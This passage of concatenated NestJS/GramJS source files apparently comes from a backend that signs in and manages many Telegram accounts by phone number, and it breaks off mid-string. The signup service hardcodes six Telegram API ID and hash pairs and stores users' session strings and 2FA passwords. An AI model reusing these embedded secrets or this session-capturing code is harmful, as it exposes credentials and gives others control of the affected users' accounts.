@IsOptional()\r\n  limit?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset ID for pagination',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset date as Unix timestamp',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetDate?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Start date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  startDate?: Date;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'End date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  endDate?: Date;\r\n}\r\n\r\n/**\r\n * Interface for message search results by type\r\n */\r\nexport class MessageTypeResult {\r\n  @ApiProperty({\r\n    description: 'Array of message IDs matching the search criteria',\r\n    type: [Number],\r\n    example: [1001, 1005, 1010]\r\n  })\r\n  @IsArray()\r\n  @IsInt({ each: true })\r\n  messages: number[];\r\n\r\n  @ApiProperty({\r\n    description: 'Total count of messages matching the search criteria',\r\n    example: 3\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  total: number;\r\n\r\n  data?: any\r\n}\r\n\r\n/**\r\n * DTO for search messages response\r\n */\r\nexport class SearchMessagesResponseDto {\r\n  @ApiPropertyOptional({\r\n    description: 'All message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  all?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Text message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  text?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Photo message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  photo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  video?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  voice?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Document message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  document?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVideo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVoice?: MessageTypeResult;\r\n}","import { IsString, IsNumber, IsOptional, IsArray, IsBoolean, Min, Max, Length, ArrayMinSize, ArrayMaxSize, IsNotEmpty, IsEnum } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MetadataType {\r\n    PHOTO = 'photo',\r\n    VIDEO = 'video',\r\n    DOCUMENT = 'document'\r\n}\r\n\r\nexport class MediaMetadataDto {\r\n    @ApiProperty({ description: 'Chat ID to get metadata from' })\r\n    @IsString()\r\n    chatId: string;\r\n\r\n    @ApiProperty({ description: 'Message offset', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    offset?: number;\r\n\r\n    @ApiProperty({ description: 'Maximum number of items', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    limit?: number = 50;\r\n}\r\n\r\nexport class DialogsQueryDto {\r\n    @ApiPropertyOptional({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(1)\r\n    @Max(1000)\r\n    limit: number = 100;\r\n\r\n    @ApiPropertyOptional({ description: 'Dialog offset', required: false, type: Number, minimum: 0 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(0)\r\n    offsetId?: number = 0;\r\n\r\n    @ApiPropertyOptional({ description: 'Include archived chats', required: false, type: Boolean })\r\n    @IsOptional()\r\n    @Transform(({ value }) => {\r\n        if (value === 'true') return true;\r\n        if (value === 'false') return false;\r\n        return value;\r\n    })\r\n    @IsBoolean()\r\n    archived?: boolean = false;\r\n}\r\n\r\nexport class BulkMessageOperationDto {\r\n    @ApiProperty({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    fromChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    toChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 })\r\n    @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n    messageIds!: number[];\r\n}","import { IsString, IsOptional, IsEnum, IsBoolean } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { PrivacyLevel, PrivacyLevelEnum } from '../../../interfaces/telegram';\r\n\r\nexport class UpdateProfileDto {\r\n  @ApiProperty({ description: 'First name' })\r\n  @IsString()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'About/bio information', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n}\r\n\r\nexport class PrivacySettingsDto {\r\n  @ApiProperty({ description: 'Phone number visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  phoneNumber?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Last seen visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  lastSeen?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Profile photos visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  profilePhotos?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Message forwards visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  forwards?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Calls privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  calls?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Group chats privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  groups?: PrivacyLevel;\r\n}\r\n\r\nexport class SecuritySettingsDto {\r\n  @ApiProperty({ description: 'Enable/disable two-factor authentication' })\r\n  @IsBoolean()\r\n  twoFactorAuth: boolean;\r\n\r\n  @ApiProperty({ description: 'Active sessions limit', required: false })\r\n  @IsOptional()\r\n  @IsEnum([1, 2, 3, 4, 5])\r\n  activeSessionsLimit?: number;\r\n}\r\n\r\nexport class ProfilePhotoDto {\r\n  @ApiProperty({ description: 'Name/identifier of the photo to set' })\r\n  @IsString()\r\n  name: string;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { BaseBatchItemDto } from './batch-operations.dto';\r\n\r\nexport class ScheduleMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message content' })\r\n  @IsString()\r\n  message: string;\r\n\r\n  @ApiProperty({ description: 'Date to schedule the message' })\r\n  @IsDateString()\r\n  @Transform(({ value }) => new Date(value))\r\n  scheduledTime: string;\r\n\r\n  @ApiProperty({ description: 'Message to reply to', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  replyTo?: number;\r\n\r\n  @ApiProperty({ description: 'Silent notification', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  silent?: boolean;\r\n}\r\n\r\nexport class GetScheduledMessagesDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Maximum number of messages to return', required: false, default: 50 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class DeleteScheduledMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'ID of the scheduled message to delete' })\r\n  @IsNumber()\r\n  messageId: number;\r\n}\r\n\r\nexport class RescheduleMessageDto {\r\n  @ApiProperty({ description: 'Chat ID containing the message' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID to reschedule' })\r\n  @IsNumber()\r\n  messageId: number;\r\n\r\n  @ApiProperty({ description: 'New schedule date (ISO string)' })\r\n  @IsDateString()\r\n  newScheduleDate: string;\r\n}\r\n\r\nexport class BatchProcessItemDto {\r\n  @ApiProperty({ description: 'Chat ID or message ID depending on operation' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID for operations that require it', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsOptional } from 'class-validator';\n\nexport class SendMessageDto {\n  @ApiProperty({\n    description: 'Target username or peer ID',\n    example: 'someusername',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiProperty({\n    description: 'Message text to send',\n    example: 'Hello from NestJS and GramJS!',\n  })\n  @IsString()\n  message: string;\n\n  @ApiProperty({\n    description: 'Optional message parse mode (Markdown, HTML)',\n    required: false,\n    example: 'Markdown',\n  })\n  @IsOptional()\n  @IsString()\n  parseMode?: 'Markdown' | 'HTML';\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString } from 'class-validator';\n\nexport class UpdateUsernameDto {\n  @ApiProperty({\n    description: 'New username to set for the Telegram user',\n    example: 'new_username123',\n  })\n  @IsString()\n  newUsername: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsEnum, IsNotEmpty, IsOptional, IsString, ValidateIf } from 'class-validator';\r\n\r\nexport enum MediaSourceType {\r\n    PATH = 'path',\r\n    BASE64 = 'base64',\r\n    BINARY = 'binary'\r\n}\r\n\r\nexport class ViewOnceMediaDto {\r\n    @ApiProperty({\r\n        description: 'Chat ID to send the view once media to',\r\n        example: '123456789'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    chatId: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Source type of the media: url, base64, or binary',\r\n        enum: MediaSourceType,\r\n        example: 'url'\r\n    })\r\n    @IsEnum(MediaSourceType)\r\n    @IsNotEmpty()\r\n    sourceType: MediaSourceType;\r\n\r\n    @ApiProperty({\r\n        description: 'URL of the media file (when sourceType is url)',\r\n        required: false,\r\n        example: 'https://example.com/image.jpg'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.PATH)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    path?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Base64 encoded media data (when sourceType is base64)',\r\n        required: false,\r\n        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BASE64)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    base64Data?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Binary media data (when sourceType is binary)',\r\n        required: false,\r\n        type: 'string',\r\n        format: 'binary'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BINARY)\r\n    binaryData?: any;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional caption for the media',\r\n        required: false,\r\n        example: 'Check this out! It will disappear after viewing'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    caption?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional filename for the media',\r\n        required: false,\r\n        example: 'secret_image.jpg'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    filename?: string;\r\n}","import TelegramManager from '../TelegramManager';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport { TelegramLogger } from './telegram-logger';\r\nimport { BadRequestException } from '@nestjs/common';\r\nimport { UsersService } from '../../../components/users/users.service';\r\nimport { TelegramClient } from 'telegram';\r\nimport { contains } from '../../../utils';\r\nimport { BotConfig, ChannelCategory } from '../../../utils/TelegramBots.config';\r\n\r\ninterface ClientInfo {\r\n    client: TelegramManager;\r\n    lastUsed: number;\r\n    autoDisconnect: boolean;\r\n}\r\n\r\ninterface GetClientOptions {\r\n    autoDisconnect?: boolean;\r\n    handler?: boolean;\r\n}\r\n\r\nclass ConnectionManager {\r\n    private static instance: ConnectionManager;\r\n    private clients: Map<string, ClientInfo>;\r\n    private readonly logger: TelegramLogger;\r\n    private cleanupInterval: NodeJS.Timeout | null = null;\r\n    private usersService: UsersService;\r\n\r\n    private constructor() {\r\n        this.clients = new Map();\r\n        this.logger = TelegramLogger.getInstance();\r\n    }\r\n\r\n    public setUsersService(usersService: UsersService) {\r\n        this.usersService = usersService;\r\n    }\r\n\r\n    public static getInstance(): ConnectionManager {\r\n        if (!ConnectionManager.instance) {\r\n            ConnectionManager.instance = new ConnectionManager();\r\n        }\r\n        return ConnectionManager.instance;\r\n    }\r\n\r\n    private async cleanupInactiveConnections(maxIdleTime: number = 180000): Promise<void> {\r\n        const now = Date.now();\r\n        for (const [mobile, connection] of this.clients.entries()) {\r\n            // Skip clients that are configured to be excluded from cleanup\r\n            if (!connection.autoDisconnect) {\r\n                continue;\r\n            }\r\n            if (now - connection.lastUsed > maxIdleTime) {\r\n                this.logger.logOperation(mobile, 'Releasing inactive connection');\r\n                await this.unregisterClient(mobile);\r\n            }\r\n        }\r\n    }\r\n\r\n    private updateLastUsed(mobile: string): void {\r\n        const connection = this.clients.get(mobile);\r\n        if (connection) {\r\n            connection.lastUsed = Date.now();\r\n            this.clients.set(mobile, connection);\r\n        }\r\n    }\r\n\r\n    public async getClient(mobile: string, options: GetClientOptions = {}): Promise<TelegramManager | undefined> {\r\n        if (!mobile) {\r\n            this.logger.logDebug('system', 'getClient called with empty mobile number');\r\n            return undefined;\r\n        }\r\n\r\n        const { autoDisconnect = true, handler = true, } = options;\r\n\r\n        this.logger.logOperation(mobile, 'Getting/Creating client', { autoDisconnect, handler });\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (clientInfo?.client) {\r\n            this.updateLastUsed(mobile);\r\n            if (clientInfo.client.connected()) {\r\n                this.logger.logOperation(mobile, 'Reusing existing connected client');\r\n                return clientInfo.client;\r\n            } else {\r\n                try {\r\n                    this.logger.logOperation(mobile, 'Reconnecting existing client');\r\n                    await clientInfo.client.connect();\r\n                    return clientInfo.client;\r\n                } catch (error) {\r\n                    this.logger.logError(mobile, 'Failed to reconnect client', error);\r\n                    await this.unregisterClient(mobile); // Clean up failed connection\r\n                }\r\n            }\r\n        }\r\n\r\n        if (!this.usersService) {\r\n            throw new Error('UsersService not initialized');\r\n        }\r\n\r\n        const user = (await this.usersService.search({ mobile }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n\r\n        const telegramManager = new TelegramManager(user.session, user.mobile);\r\n        let client: TelegramClient;\r\n\r\n        try {\r\n            client = await telegramManager.createClient(handler);\r\n            await client.getMe();\r\n\r\n            if (client) {\r\n                await this.registerClient(\r\n                    mobile,\r\n                    telegramManager,\r\n                    { autoDisconnect }\r\n                );\r\n                this.logger.logOperation(mobile, 'Client created successfully');\r\n                return telegramManager;\r\n            } else {\r\n                throw new BadRequestException('Client Expired');\r\n            }\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Client creation failed', error);\r\n            this.logger.logDebug(mobile, 'Parsing error details...');\r\n            await this.unregisterClient(mobile);\r\n            const errorDetails = parseError(error, mobile, false);\r\n            await BotConfig.getInstance().sendMessage(ChannelCategory.ACCOUNT_LOGIN_FAILURES, `${process.env.clientId}::${mobile}\\n\\n${errorDetails.message}`);\r\n            if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"revoked\", \"user_deactivated_ban\"])) {\r\n                this.logger.logOperation(mobile, 'Marking user as expired');\r\n                await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\r\n            }\r\n            throw new BadRequestException(errorDetails.message);\r\n        }\r\n    }\r\n\r\n    public hasClient(number: string): boolean {\r\n        return this.clients.has(number);\r\n    }\r\n\r\n    public async disconnectAll(): Promise<void> {\r\n        this.logger.logOperation('system', 'Disconnecting all clients');\r\n        const clientMobiles = Array.from(this.clients.keys());\r\n        await Promise.all(\r\n            clientMobiles.map(mobile => {\r\n                this.logger.logOperation(mobile, 'Disconnecting client');\r\n                return this.unregisterClient(mobile);\r\n            })\r\n        );\r\n        this.clients.clear();\r\n        this.logger.logOperation('system', 'All clients disconnected');\r\n    }\r\n\r\n    private async registerClient(\r\n        mobile: string,\r\n        telegramManager: TelegramManager,\r\n        options: { autoDisconnect: boolean } = { autoDisconnect: true }\r\n    ): Promise<void> {\r\n        this.clients.set(mobile, {\r\n            client: telegramManager,\r\n            lastUsed: Date.now(),\r\n            autoDisconnect: options.autoDisconnect\r\n        });\r\n        this.logger.logOperation(mobile, `Client registered successfully${!options.autoDisconnect ? ' (excluded from auto-cleanup)' : ''}`);\r\n    }\r\n\r\n    public async unregisterClient(\r\n        mobile: string,\r\n    ): Promise<void> {\r\n        try {\r\n            const clientInfo = this.clients.get(mobile);\r\n            if (clientInfo) {\r\n                await clientInfo.client?.disconnect();\r\n                this.logger.logOperation(mobile, 'Client unregistered successfully');\r\n            } else {\r\n                this.logger.logError(mobile, 'Client not found for unregistration', new Error('Client not found'));\r\n            }\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Error in unregisterClient', error);\r\n        } finally {\r\n            this.clients.delete(mobile);\r\n        }\r\n    }\r\n\r\n    public getActiveConnectionCount(): number {\r\n        return this.clients.size;\r\n    }\r\n\r\n    public startCleanupInterval(intervalMs: number = 300000): NodeJS.Timeout {\r\n        this.cleanupInterval = setInterval(() => {\r\n            this.cleanupInactiveConnections().catch(err => {\r\n                this.logger.logError('system', 'Error in cleanup interval', err);\r\n            });\r\n        }, intervalMs);\r\n        return this.cleanupInterval;\r\n    }\r\n\r\n    public stopCleanupInterval(): void {\r\n        if (this.cleanupInterval) {\r\n            clearInterval(this.cleanupInterval);\r\n            this.cleanupInterval = null;\r\n        }\r\n    }\r\n}\r\n\r\nexport const connectionManager = ConnectionManager.getInstance();\r\n","import { Logger } from '@nestjs/common';\r\n\r\nexport class TelegramLogger {\r\n    private static instance: TelegramLogger;\r\n    private logger: Logger;\r\n\r\n    private constructor() {\r\n        this.logger = new Logger('TelegramService');\r\n    }\r\n\r\n    static getInstance(): TelegramLogger {\r\n        if (!TelegramLogger.instance) {\r\n            TelegramLogger.instance = new TelegramLogger();\r\n        }\r\n        return TelegramLogger.instance;\r\n    }\r\n\r\n    logOperation(mobile: string, operation: string, details?: any): void {\r\n        this.logger.log(`[${mobile}] ${operation} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logError(mobile: string, operation: string, error: any): void {\r\n        this.logger.error(\r\n            `[${mobile}] ${operation} failed - ${error.message}`,\r\n            error.stack\r\n        );\r\n    }\r\n\r\n    logWarning(mobile: string, message: string, details?: any): void {\r\n        this.logger.warn(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logDebug(mobile: string, message: string, details?: any): void {\r\n        this.logger.debug(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { TgSignupService } from './TgSignup.service';\r\n\r\n@Module({\r\n    imports: [forwardRef(() => UsersModule)],\r\n    controllers: [TgSignupController],\r\n    providers: [TgSignupService],\r\n    exports: [TgSignupService]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Injectable, BadRequestException, Logger, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\r\nimport { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { UsersService } from \"../users/users.service\";\r\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\r\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\r\nimport { parseError } from \"../../utils/parseError\";\r\n\r\ninterface ITelegramCredentials {\r\n    apiId: number;\r\n    apiHash: string;\r\n}\r\n\r\n@Injectable()\r\nexport class TgSignupService implements OnModuleDestroy {\r\n    private readonly logger = new Logger(TgSignupService.name);\r\n    private static readonly LOGIN_TIMEOUT = 300000; // 10 minutes instead of 2.5\r\n    private static readonly SESSION_CLEANUP_INTERVAL = 300000; // 5 minutes instead of 2\r\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\r\n    private readonly cleanupInterval: NodeJS.Timeout;\r\n\r\n    // Map to store active client sessions\r\n    private static readonly activeClients = new Map<string, {\r\n        client: TelegramClient;\r\n        phoneCodeHash: string;\r\n        timeoutId: NodeJS.Timeout;\r\n        createdAt: number;\r\n    }>();\r\n\r\n    // API credentials pool for load balancing with correct hashes\r\n    private static readonly API_CREDENTIALS: ITelegramCredentials[] = [\r\n        { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\r\n        { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\r\n        { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\r\n        { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\r\n        { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\r\n        { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\r\n    ];\r\n\r\n    constructor(private readonly usersService: UsersService) {\r\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\r\n    }\r\n\r\n    async onModuleDestroy() {\r\n        clearInterval(this.cleanupInterval);\r\n        // Cleanup all active sessions\r\n        const phones = Array.from(TgSignupService.activeClients.keys());\r\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\r\n    }\r\n\r\n    private getRandomCredentials(): ITelegramCredentials {\r\n        const index = Math.floor(Math.random() * TgSignupService.API_CREDENTIALS.length);\r\n        return TgSignupService.API_CREDENTIALS[index];\r\n    }\r\n\r\n    private async cleanupStaleSessions() {\r\n        for (const [phone, session] of TgSignupService.activeClients) {\r\n            try {\r\n                // Only cleanup if session is truly stale (disconnected and timeout exceeded)\r\n                if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT &&\r\n                    (!session.client || !session.client.connected)) {\r\n                    await this.disconnectClient(phone);\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);\r\n            }\r\n        }\r\n    }\r\n\r\n    private validatePhoneNumber(phone: string): string {\r\n        // Remove any existing + prefix\r\n        phone = phone.replace(/^\\+/, '');\r\n\r\n        // Validate phone number format\r\n        if (!/^\\d{8,15}$/.test(phone)) {\r\n            throw new BadRequestException('Please enter a valid phone number');\r\n        }\r\n\r\n        return phone;\r\n    }\r\n\r\n    private async disconnectClient(phone: string): Promise<void> {\r\n        const session = TgSignupService.activeClients.get(phone);\r\n        if (session) {\r\n            try {\r\n                clearTimeout(session.timeoutId);\r\n                if (session.client?.connected) {\r\n                    await session.client.disconnect();\r\n                }\r\n                if (session.client) {\r\n                    await session.client.destroy();\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\r\n            } finally {\r\n                TgSignupService.activeClients.delete(phone);\r\n            }\r\n        }\r\n    }\r\n\r\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            // Check if there's an existing active session that can be reused\r\n            const existingSession = TgSignupService.activeClients.get(phone);\r\n            if (existingSession && existingSession.client?.connected) {\r\n                // If session exists and is still valid, disconnect it before creating new one\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            const { apiId, apiHash } = this.getRandomCredentials();\r\n            const session = new StringSession('');\r\n            const client = new TelegramClient(session, apiId, apiHash, {\r\n                connectionRetries: 5,\r\n                retryDelay: 2000,\r\n                useWSS: true,\r\n                timeout: 30000\r\n            });\r\n\r\n            await client.setLogLevel(LogLevel.ERROR);\r\n\r\n            await client.connect();\r\n\r\n            const sendResult = await client.invoke(\r\n                new Api.auth.SendCode({\r\n                    phoneNumber: phone,\r\n                    apiId,\r\n                    apiHash,\r\n                    settings: new Api.CodeSettings({\r\n                        currentNumber: true,\r\n                        allowAppHash: true,\r\n                    }),\r\n                })\r\n            );\r\n\r\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\r\n                this.logger.error(`Unexpected immediate login for ${phone}`);\r\n                throw new BadRequestException('Unexpected immediate login');\r\n            }\r\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            TgSignupService.activeClients.set(phone, {\r\n                client,\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                timeoutId,\r\n                createdAt: Date.now()\r\n            });\r\n\r\n            return {\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\r\n            await this.disconnectClient(phone);\r\n            \r\n            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {\r\n                throw new BadRequestException('This phone number has been banned from Telegram');\r\n            }\r\n            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {\r\n                throw new BadRequestException('Please enter a valid phone number');\r\n            }\r\n            if (error.errorMessage?.includes('FLOOD_WAIT')) {\r\n                throw new BadRequestException('Please wait a few minutes before trying again');\r\n            }\r\n            \r\n            throw new BadRequestException('Unable to send OTP. Please try again');\r\n        }\r\n    }\r\n\r\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            const session = TgSignupService.activeClients.get(phone);\r\n            if (!session) {\r\n                this.logger.warn(`No active signup session found for ${phone}`);\r\n                throw new BadRequestException('Session Expired. Please start again');\r\n            }\r\n\r\n            // Always extend session timeout on verification attempt, regardless of success\r\n            clearTimeout(session.timeoutId);\r\n            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            if (!session.client?.connected) {\r\n                try {\r\n                    await session.client?.connect();\r\n                } catch (error) {\r\n                    // Don't disconnect, just try to reconnect\r\n                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);\r\n                    try {\r\n                        const { apiId, apiHash } = this.getRandomCredentials();\r\n                        const newSession = new StringSession('');\r\n                        const newClient = new TelegramClient(newSession, apiId, apiHash, {\r\n                            connectionRetries: 5,\r\n                            retryDelay: 2000,\r\n                            useWSS: true,\r\n                            timeout: 30000\r\n                        });\r\n                        await newClient.connect();\r\n                        session.client = newClient;\r\n                    } catch (reconnectError) {\r\n                        throw new BadRequestException('Connection failed. Please try verifying again.');\r\n                    }\r\n                }\r\n            }\r\n\r\n            const { client, phoneCodeHash } = session;\r\n\r\n            try {\r\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\r\n                const signInResult = await client.invoke(\r\n                    new Api.auth.SignIn({\r\n                        phoneNumber: phone,\r\n                        phoneCodeHash,\r\n                        phoneCode: code,\r\n                    })\r\n                ) as Api.auth.Authorization;\r\n\r\n                if (!signInResult) {\r\n                    throw new BadRequestException('Invalid response from Telegram server');\r\n                }\r\n\r\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                    this.logger.log(`New user registration required for ${phone}`);\r\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\r\n                    await this.disconnectClient(phone);\r\n                    return result;\r\n                }\r\n\r\n                // Store the session string before processing\r\n                const sessionString = client.session.save() as unknown as string;\r\n                if (!sessionString) {\r\n                    throw new Error('Failed to generate session string');\r\n                }\r\n\r\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n                await this.disconnectClient(phone);\r\n                return userData;\r\n            } catch (error) {\r\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\r\n                    this.logger.warn(`2FA required for ${phone}`);\r\n                    if (!password) {\r\n                        return {\r\n                            status: 400,\r\n                            message: 'Two-factor authentication 